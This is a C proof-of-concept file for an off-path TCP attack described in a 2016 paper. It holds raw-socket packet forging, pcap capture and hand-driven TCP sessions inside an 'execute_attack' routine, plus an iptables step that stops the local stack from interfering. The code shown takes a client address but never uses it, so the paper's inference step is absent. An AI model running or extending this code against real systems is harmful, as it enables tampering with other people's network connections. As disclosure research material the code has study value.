/*
 * Proof-of-concept code for:
 * "Off-Path TCP Exploits: Global Rate Limit Considered Dangerous"
 * http://www.cs.ucr.edu/~zhiyunq/pub/sec16_TCP_pure_offpath.pdf
 *
 * by Joshua J. Drake (jdrake@zimperium.com) on 2016-08-18
 *
 * NOTE: You need to use iptables to DROP packets from the target host/port
 *
 * # iptables -A INPUT -j DROP -p tcp -s [server addr] --sport [server port]
 *
 * Otherwise, your legitimate TCP stack will interfere with this program's
 * operation.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* internet networking */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

/* packet capturing */
#include <pcap/pcap.h>

/* raw packet crafting */
#define __FAVOR_BSD 1
#include <netinet/ip.h>
#include <netinet/tcp.h>

/* terminal interactions */
#include <termios.h>


/* TCP connection tracking */
typedef enum {
	CS_NEW = 0,
	CS_SYN_SENT,
	CS_CONNECTED,
	CS_FINISHED
} cstate_t;

const char *g_conn_states[] = {
	"NEW",
	"SYN",
	"EST",
	"FIN"
};

typedef struct conn_struct {
	cstate_t state;
	u_short id;
	struct sockaddr_in *src;
	struct sockaddr_in *dst;
	/* in host endian */
	u_long seq;
	u_long ack;
} conn_t;


/*
 * if DEVICE is not defined, we'll try to find a suitable device..
 */
// #define DEVICE "ppp0"
#define SNAPLEN 1500


/* prototypes.. */
int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli);

u_short in_cksum(u_short *addr, int len);
void tcp_init(conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq);
int tcp_send(int s, conn_t *pconn, u_char flags, char *data, int len);
int tcp_recv(struct pcap_pkthdr *pph, int ipoff, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
#ifdef DEBUG_SEQ
	, cstate_t conn_state
#endif
	);
char *tcp_flags(u_char flags);

void setterm(int mode);
int kbhit(void);

int lookup_host(char *hostname, struct sockaddr_in *addr);
int get_raw_socket(void);
int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2ip);


/*
 * The main function of this program simply checks prelimary arguments and
 * and launches the attack.
 */
int main(int argc, char *argv[])
{
	int srvport;
	char myhost[512];
	struct sockaddr_in myaddr, srvaddr, cliaddr;

	/* we're not leaving main until we're sure the arguments are good. */
	if (argc < 4) {
		fprintf(stderr, "usage: %s <server addr> <server port> <client addr> [<client port>]\n", argv[0]);
		return 1;
	}

	/* see if we can get the target server address */
	memset(&srvaddr, 0, sizeof(srvaddr));
	if (!lookup_host(argv[1], &srvaddr))
		return 1;

	/* see if we can get the client's address */
	memset(&cliaddr, 0, sizeof(cliaddr));
	if (!lookup_host(argv[3], &cliaddr))
		return 1;

	/* make sure the target port is valid */
	srvport = atoi(argv[2]);
	if (srvport < 1 || srvport > 65535) {
		fprintf(stderr, "[!] %s is not a valid port.\n", argv[2]);
		return 1;
	}

	/* it's valid, so I plug it in the the remaddr struct */
	srvaddr.sin_port = htons((u_short)srvport);

	/* lookup ourself */
	memset(&myaddr, 0, sizeof(myaddr));
	if (gethostname(myhost, sizeof(myhost)) == -1) {
		perror("[!] gethostname");
		return 1;
	}
	if (!lookup_host(myhost, &myaddr))
		return 1;

	/* here we go.. WOOO */
	return execute_attack(&myaddr, &srvaddr, &cliaddr);
}


/*
 * this function attempts to get a raw socket via socket(2). If we get one, we
 * check whether IP_HDRINCL is defined or not and set the socket option if it
 * is. for that, we use setsockopt(2).
 *
 * on succes, we reutrn the socket descriptor, on error, we return -1 (what
 * socket() returns on error) to report errors, use perror(3)
 */
int get_raw_socket(void)
{
	int socket_descriptor, on = 1;

	socket_descriptor = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (socket_descriptor == -1) {
		perror("[!] raw socket");
	}
#ifdef IP_HDRINCL
	else if (setsockopt(socket_descriptor, IPPROTO_IP, IP_HDRINCL, (const void *)&on, sizeof(on)) < 0)
		perror("[!] setsockopt(..., IP_HDRINCL, 1, ...)");
#endif
	return socket_descriptor;
}


/*
 * attempt to resolve hostname as an ip address using inet_aton(3). if it
 * fails, we must have a DNS name so we try to look it up via gethostbyname(3).
 * if all is good, we fill in addr so that it can be returned via result
 * paramter, and return 1.
 *
 * if the lookup fails, we return 0. to report errors, we use herror(3)
 */
int lookup_host(char *hostname, struct sockaddr_in *addr)
{
	struct hostent *hent;

	addr->sin_family = AF_INET;
	if (!inet_aton(hostname, &(addr->sin_addr))) {
		hent = gethostbyname(hostname);
		if (hent == (struct hostent *)NULL) {
			char errstr[1024] = { 0 };

			snprintf(errstr, sizeof(errstr) - 1, "[!] Unable to resolve: \"%s\"", hostname);
			herror(errstr);
			return 0;
		}
		memcpy(&(addr->sin_addr), hent->h_addr, sizeof(struct in_addr));
	}
	return 1;
}


/*
 * try to start capturing packets from the specified host+port to the local
 * machine on the specified port.
 *
 * on succes, we return 1, on failure, 0
 */
int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2ip)
{
   struct bpf_program bpfp; /* needed to set the filter */
   char errorstr[PCAP_ERRBUF_SIZE], filterstr[80], *iface;
   int filter = 1;

#ifdef DEVICE
   iface = (char *)malloc(16);
   strncpy(iface, DEVICE, sizeof(iface));
#else
   iface = pcap_lookupdev(errorstr);
   if (iface == NULL) {
	   fprintf(stderr, "[!] Unable to find a suitable capture device: %s\n", errorstr);
	   return 0;
   }
#endif
   printf("[*] Starting capture on \"%s\" ...\n", iface);

   *pcap = pcap_open_live(iface, SNAPLEN, 1, 25, errorstr);
#ifdef DEVICE
   free(iface);
#endif
   if (*pcap == (pcap_t *)NULL) {
	   fprintf(stderr, "[!] pcap_open_live() failed: %s\n", errorstr);
	   return 0;
   }

   switch (pcap_datalink(*pcap)) {
	   case DLT_EN10MB:
		   *off2ip = 14;
		   break;

	   case DLT_SLIP:
		   *off2ip = 16;
		   break;

      case DLT_PPP:
		   *off2ip = 4;
		   filter = 0;
		   fprintf(stderr, "[-] PPP doesn't have filtering, problems may occur.\n");
		   break;

	  case DLT_FDDI:
		   fprintf(stderr, "[!] FDDI is not supported!\n");
		   return 1;

	  case DLT_RAW:
		   fprintf(stderr, "[-] Using the RAW datalink.\n");
		   *off2ip = 0;
		   break;

	  default:
		   *off2ip = 4;
		   break;
   }

   if (filter) {
	   sprintf(filterstr, "tcp and src %s and src port %d and dst port %d", inet_ntoa(psrv->sin_addr),
			   ntohs(psrv->sin_port), lport);
	   if (pcap_compile(*pcap, &bpfp, filterstr, 1, 0) == -1)
		   return 0;
	   if (pcap_setfilter(*pcap, &bpfp) == -1)
		   return 0;
   }
   return 1;
}


/*
 * this function does the dirty work.
 *
 * it starts by opening a raw socket and starting to capture packets for the
 * legit connection.
 *
 * next, we execute a three-way handshake to get connected.
 *
 * finally, we loop for packets that we captured and do maintenance on the TCP
 * session as needed.
 *
 * special keys while in the data loop:
 *  control-U         (erase to beginning of line)
 * 	control-[ (Esc)   (closes connection and exits)
 */
int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli)
{
	int rsd, lport = getpid() + 1000;
	conn_t legit_conn;
	int ipoff = 0;
	pcap_t *pch = NULL;
	struct pcap_pkthdr *pchdr = NULL;
	const u_char *inbuf = NULL;
	int pcret;
	char outbuf[8192];
	int outlen = 0;

	if ((rsd = get_raw_socket()) == -1)
	   return 1;

	printf("[*] Selected local port: %d\n", lport);

	if (!start_pcap(&pch, psrv, lport, &ipoff)) {
		pcap_perror(pch, "[!] Unable to start packet capture");
		return 1;
	}

	/* set the local port */
	ploc->sin_port = htons(lport);

	/* first, make a legit connection to the server */
	tcp_init(&legit_conn, ploc, psrv, getpid() * 3000);
	if (!tcp_send(rsd, &legit_conn, TH_SYN, NULL, 0))
		return 1;
	legit_conn.state = CS_SYN_SENT;

	while (legit_conn.state != CS_FINISHED) {
		pcret = pcap_next_ex(pch, &pchdr, &inbuf);
		//printf("[*] pcret: %d\n", pcret);

		if (pcret == 1) {
			u_char flags;
			u_long rack, rseq;
			void *data;
			size_t datalen;

			if (tcp_recv(pchdr, ipoff, inbuf, &flags, &rack, &rseq, &data, &datalen
#ifdef DEBUG_SEQ
						, legit_conn.state
#endif
						)) {
				switch (legit_conn.state) {

					case CS_SYN_SENT:
						/* see if we got a SYN|ACK */
						if ((flags & TH_SYN) && (flags & TH_ACK)
								&& rack == legit_conn.seq + 1) {

							//printf("[*] Got SYN|ACK with matching ACK num!\n");

							/* we need to ACK the seq */
							legit_conn.seq = rack;
							legit_conn.ack = rseq + 1;
							tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
							legit_conn.state = CS_CONNECTED;

							printf("tcp handshake complete.. proceed with what you planned to do..\n");
							printf("------------------------------------------------------------------------------\n");
							setterm(0);
						}
						break;

					case CS_CONNECTED:
						/* see if we got data from remote... */
						if ((flags & TH_PUSH) && (flags & TH_ACK)
								&& rack == legit_conn.seq) {

							//printf("[*] PSH|ACK received (len %lu)\n", datalen);
							if (datalen > 0) {
								write(fileno(stdout), data, datalen);
								legit_conn.ack += datalen;
								tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
							}
						}

						/* they just ack'd what we sent only... */
						else if (flags == TH_ACK && rack == legit_conn.seq) {
							//printf("[*] ACK received (len %lu)\n", datalen);
							if (datalen > 0) {
								write(fileno(stdout), data, datalen);
								legit_conn.ack += datalen;
								tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
							}
						}

						/* perhaps the remote said to shut down... */
						else if (flags & TH_FIN) {
							printf("[*] FIN received\n");
							legit_conn.ack++;
							tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
							tcp_send(rsd, &legit_conn, TH_FIN, NULL, 0);
							legit_conn.state++;
						}

						else if (flags & TH_RST) {
							if (rseq == legit_conn.ack) {
								printf("[*] RST received\n");
								legit_conn.state++;
							}
							/* otherwise, drop the RST */
						}

						else
							printf("[*] Packet with unexpected flags (0x%x) received...\n", flags);

						break;

					default:
						printf("unknown state??\n");
						break;
				}
			}
		}

		/* packet read failure? */
		if (pcret < 0)
			break;

		/* check for keyboard input */
		while (kbhit() == 1) {
			int i, ch = getchar();

			//printf("GOT INPUT!\n");
			switch (ch)
			{
				case 0xa: // LF
				case 0xd: // CR
					outbuf[outlen++] = '\n';
					tcp_send(rsd, &legit_conn, TH_PUSH|TH_ACK, outbuf, outlen);
					legit_conn.seq += outlen;
					outlen = 0;
					break;

				case 0x15: // ^U (NAK)
					for (i = 0; i < outlen; i++)
						write(fileno(stdout), "\b \b", 3);
					outlen = 0;
					break;

				case 0x1b: // ^[ (ESC)
					printf("[*] Connection closed.\n");
					tcp_send(rsd, &legit_conn, TH_FIN, NULL, 0);
					legit_conn.seq++;
					sleep(1);
					tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
					legit_conn.state = CS_FINISHED;
					break;

				default:
					outbuf[outlen++] = ch;
					break;
			}
		}

	}

	setterm(1);
	pcap_close(pch);
	close(rsd);
	return 0;
}


/*
 * initialize a connection structure from the parameters
 */
void tcp_init(conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq)
{
	pconn->id = (getpid() + 1337) & 0xffff;
	pconn->state = CS_NEW;
	pconn->src = psrc;
	pconn->dst = pdst;
	pconn->seq = seq;
	pconn->ack = 0;
}


/*
 * ripped from ping.c, it calulates the checksum of len bytes at addr and
 * returns it.
 */
u_short in_cksum(u_short *addr, int len)
{
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return answer;
}
/* end ping ripped */


/*
 * this is based on Matt Barrie's old non-working TCPseqnumpred.c
 * the problem with that program was not this function however..
 */
int tcp_send(int s, conn_t *pconn, u_char flags, char *data, int len)
{
	struct ip ip;
	struct tcphdr tcp;
	char tcpbuf[4096], *ptr;
	char packet[8192];
	u_short size;

	/* construct the IP header */
	ip.ip_hl = sizeof(ip) / 4;
	ip.ip_v = 4;
	ip.ip_tos = 0;
	ip.ip_len = htons(sizeof(ip) + sizeof(tcp) + len);
	ip.ip_id = htons(pconn->id);
	pconn->id++;
	ip.ip_off = 0;
	ip.ip_ttl = 255;
	ip.ip_p = IPPROTO_TCP;
	ip.ip_sum = 0;
	ip.ip_src.s_addr = pconn->src->sin_addr.s_addr;
	ip.ip_dst.s_addr = pconn->dst->sin_addr.s_addr;

	/* calculate the IP checksum */
	ip.ip_sum = in_cksum((u_short *)&ip, sizeof(ip));

	/* construct the TCP header */
	tcp.th_sport = pconn->src->sin_port;
	tcp.th_dport = pconn->dst->sin_port;
	tcp.th_seq = htonl(pconn->seq);
	tcp.th_ack = htonl(pconn->ack);
	tcp.th_x2 = 0;
	tcp.th_off = 5;
	tcp.th_flags = flags;
	tcp.th_win = htons(10052);
	tcp.th_sum = 0;
	tcp.th_urp = 0;

	/* calculate the TCP checksum */
	ptr = tcpbuf;
	memset(tcpbuf, 0, sizeof(tcpbuf));
	memcpy(ptr, &(ip.ip_src.s_addr), 8);
	ptr += 9;
	*ptr++ = ip.ip_p;
	size = htons(len + sizeof(tcp));
	memcpy(ptr, &size, 2);
	ptr += 2;
	memcpy(ptr, &tcp, sizeof(tcp));
	ptr += sizeof(tcp);
	memcpy(ptr, data, len);
	tcp.th_sum = in_cksum((u_short *)tcpbuf, sizeof(tcp) + 12 + len);

	/* build the final packet */
	ptr = packet;
	memcpy(ptr, &ip, sizeof(ip));
	ptr += sizeof(ip);
	memcpy(ptr, &tcp, sizeof(tcp));
	ptr += sizeof(tcp);
	memcpy(ptr, data, len);

	if (sendto(s, packet, sizeof(ip) + sizeof(tcp) + len, 0,
				(struct sockaddr *)pconn->dst, sizeof(struct sockaddr_in)) == -1) {
		perror("[!] sendto() failed");
		return 0;
	}
	/* success!! */
#ifdef DEBUG_SEQ
	printf("[*] %s : %d --> %d : %s : seq %lu, ack %lu (len %lu)\n",
			g_conn_states[pconn->state],
			ntohs(tcp.th_sport), ntohs(tcp.th_dport),
			tcp_flags(tcp.th_flags), pconn->seq, pconn->ack, (u_long)len);
#endif
	return 1;
}


/*
 * process the packet captured by libpcap. if everything goes well, we return
 * the TCP flags, ack, seq, and data (w/len) to the caller.
 */
int tcp_recv(struct pcap_pkthdr *pph, int ipoff, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
#ifdef DEBUG_SEQ
		, cstate_t conn_state
#endif
		)
{
	struct ip *pip;
	struct tcphdr *ptcp;
	void *ptr;
	size_t iplen, tcplen, datalen;

	if (pph->caplen < ipoff + sizeof(struct ip)) {
		fprintf(stderr, "[!] tcp_recv: too short to be an IP packet!\n");
		return 0;
	}
	ptr = (void *)inbuf + ipoff;
	pip = (struct ip *)ptr;
	iplen = pip->ip_hl * 4;
	if (pph->caplen < ipoff + iplen) {
		fprintf(stderr, "[!] tcp_recv: too short to be an IP packet (w/options)!\n");
		return 0;
	}
	ptr += iplen;
	if (pph->caplen < ipoff + iplen + sizeof(struct tcphdr)) {
		fprintf(stderr, "[!] tcp_recv: too short to be a TCP packet!\n");
		return 0;
	}
	ptcp = (struct tcphdr *)ptr;
	tcplen = ptcp->th_off * 4;
	ptr += tcplen;
	if (pph->caplen < ipoff + iplen + tcplen) {
		fprintf(stderr, "[!] tcp_recv: too short to be a TCP packet (w/options)!\n");
		return 0;
	}
	datalen = ntohs(pip->ip_len);
	if (iplen + tcplen > datalen) {
		fprintf(stderr, "[!] tcp_recv: IP.IP_LEN too small!\n");
		return 0;
	}
	datalen -= (iplen + tcplen);

#ifdef DEBUG_SEQ
	//printf("inbuf %p, ptcp %p, ptctp+1 %p, caplen %lu\n", inbuf, ptcp, ptcp+1, (u_long)pph->caplen);
	printf("[*] %s : %d <-- %d : %s : seq %lu, ack %lu (len: %lu)\n",
			g_conn_states[conn_state],
			ntohs(ptcp->th_dport), ntohs(ptcp->th_sport),
			tcp_flags(ptcp->th_flags),
			(u_long)ntohl((u_long)ptcp->th_seq), (u_long)ntohl((u_long)ptcp->th_ack), datalen);
#endif


	/* save the output parameters and return */
	if (flags)
		*flags = ptcp->th_flags;
	if (pack)
		*pack = ntohl((u_long)ptcp->th_ack);
	if (pseq)
		*pseq = ntohl((u_long)ptcp->th_seq);
	if (pdata) {
		if (datalen > 0)
			*pdata = ptr;
		else
			*pdata = NULL;
	}
	if (plen)
		*plen = datalen;

	return 1;
}


/*
 * return a string showing which flags are set in the TCP packet
 *
 * netinet/tcp.h:# define TH_FIN      0x01
 * netinet/tcp.h:# define TH_SYN      0x02
 * netinet/tcp.h:# define TH_RST      0x04
 * netinet/tcp.h:# define TH_PUSH     0x08
 * netinet/tcp.h:# define TH_ACK      0x10
 * netinet/tcp.h:# define TH_URG      0x20
 */
char *tcp_flags(u_char flags)
{
	static char str[16];
	char *ptr = str;

	if (flags & TH_FIN)
		*ptr++ = 'F';
	if (flags & TH_SYN)
		*ptr++ = 'S';
	if (flags & TH_RST)
		*ptr++ = 'R';
	if (flags & TH_PUSH)
		*ptr++ = 'P';
	if (flags & TH_ACK)
		*ptr++ = 'A';
	if (flags & TH_URG)
		*ptr++ = 'U';
	*ptr++ = '\0';
	return str;
}


/*
 * prym wrote this stuff for me a long time ago, i thank him for it..
 * i modded it to make it portable (i hope)
 *
 * this function will set the terminal to ICANON (canonical mode). this
 * disables line buffering processing special characters (such as EOF, EOL,
 * WERASE etc).
 */
void setterm(int mode)
{
	static struct termios foo, boo;

	switch(mode) {
		case 0:
			tcgetattr(fileno(stdin), &foo);
			memcpy(&boo, &foo, sizeof(struct termios));
			foo.c_lflag &= ~ICANON;
			tcsetattr(fileno(stdin), TCSANOW, &foo);
			break;
		default:
			tcsetattr(fileno(stdin), TCSANOW, &boo);
			break;
	}
}

/*
 * this function select(2)s stdin and returns 1 if there are characters in the
 * input buffer within the alotted time.
 * otherwise it returns 0 (what select(2) returns)
 */
int kbhit(void)
{
	fd_set rfds;
	struct timeval tv;

	FD_ZERO(&rfds);
	FD_SET(fileno(stdin), &rfds);
	tv.tv_sec = 0;
	tv.tv_usec = 25000;

	return select(fileno(stdin) + 1, &rfds, NULL, NULL, &tv);
}
/* thanks again prym */
